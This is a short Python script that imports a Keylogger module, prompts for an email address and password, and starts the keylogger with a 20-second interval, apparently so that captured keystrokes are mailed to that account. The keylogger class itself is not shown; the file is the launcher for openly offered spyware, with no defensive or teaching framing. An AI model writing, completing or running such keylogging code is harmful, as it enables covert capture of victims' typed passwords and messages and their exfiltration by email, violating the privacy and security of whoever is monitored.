#!/usr/bin/env python
import Keylogger

email = input("Enter an Email Address: ")
password = input("Enter the Password for the Email: ")
# time_interval = input("Enter the Time Interval After Which You Need the Records : ")

my_keylogger = Keylogger.Keylogger(20,email, password)
my_keylogger.start()
